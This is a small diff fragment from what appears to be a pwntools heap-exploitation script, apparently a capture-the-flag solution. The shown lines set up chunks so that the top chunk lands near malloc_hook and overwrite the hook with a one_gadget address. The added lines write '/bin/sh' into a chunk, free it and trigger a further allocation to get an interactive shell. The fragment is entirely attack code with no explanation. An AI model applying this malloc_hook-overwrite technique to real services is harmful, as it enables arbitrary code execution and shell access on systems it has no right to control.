@@ -105,4 +105,12 @@ malloc(0x28) # 14, Will be serviced by smallbins 0x40
 malloc(0x28) # 15, will be serviced by top chunk which is at malloc_hook-35
 write(b"A"*19 + p64(one_gadget), 15)
 
+write(b"/bin/sh\x00", 14)
+free(14)
+
+io.sendline(b"1")
+io.sendlineafter(b"idx:", b"14")
+io.sendlineafter(b"size:", b"0x28")
+
+
 io.interactive()
